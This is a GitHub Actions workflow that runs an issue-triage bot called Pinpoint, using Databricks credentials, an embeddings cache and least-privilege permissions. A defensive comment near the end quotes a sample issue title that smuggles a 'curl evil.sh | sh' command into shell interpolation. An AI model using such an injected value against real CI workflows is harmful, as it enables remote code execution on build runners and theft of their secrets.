# Pinpoint bot: copy to .github/workflows/pinpoint.yml in the repo to triage.
# Needs two repo secrets: DATABRICKS_HOST (https://dbc-....cloud.databricks.com) and DATABRICKS_TOKEN
# (a Databricks personal access token). Posting uses the job's own GITHUB_TOKEN; nothing else.
name: Pinpoint

on:
  issues:
    types: [opened]

# Least privilege: read the code, write issue comments. Nothing else.
permissions:
  contents: read
  issues: write

# One triage at a time: a burst of new issues can't burn the Databricks quota in parallel.
concurrency:
  group: pinpoint
  cancel-in-progress: false

jobs:
  triage:
    if: github.event.issue.user.type != 'Bot'
    runs-on: ubuntu-latest
    timeout-minutes: 60          # a cold repo embeds every function once; later runs reuse the cache
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0         # full history: the default (1 commit) would make one commit "own" every line

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      # Cache entries are immutable, so save under a fresh key every run and restore the newest
      # one by prefix: each run starts from the last run's embeddings and only embeds changed functions.
      - uses: actions/cache@v4
        with:
          path: ~/.cache/pinpoint
          key: pinpoint-embeddings-${{ github.run_id }}
          restore-keys: pinpoint-embeddings-

      - name: Install Pinpoint
        run: pip install "pinpoint[bot] @ ${PINPOINT_SOURCE}"
        env:
          PINPOINT_SOURCE: git+https://github.com/Vishaal-G/PinPoint.git

      # Optional: embed on the runner instead of the Databricks endpoint (bge-small through fastembed,
      # ~16 s extra install, no PyTorch). Install "pinpoint[bot,local-embed] @ ..." above and add to the
      # Triage env:  PINPOINT_EMBEDDER: local  and  FASTEMBED_CACHE_PATH: ~/.cache/pinpoint/fastembed
      # (keeps the model in the cache above). The LLM step still uses Databricks.

      # The issue text is NOT interpolated here (no ${{ github.event.issue.* }} in `run:`): a title like
      # `"; curl evil.sh | sh; "` would run as shell. pinpoint-bot reads it from $GITHUB_EVENT_PATH as data.
      - name: Triage
        run: pinpoint-bot
        env:
          GITHUB_TOKEN: ${{ github.token }}
          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
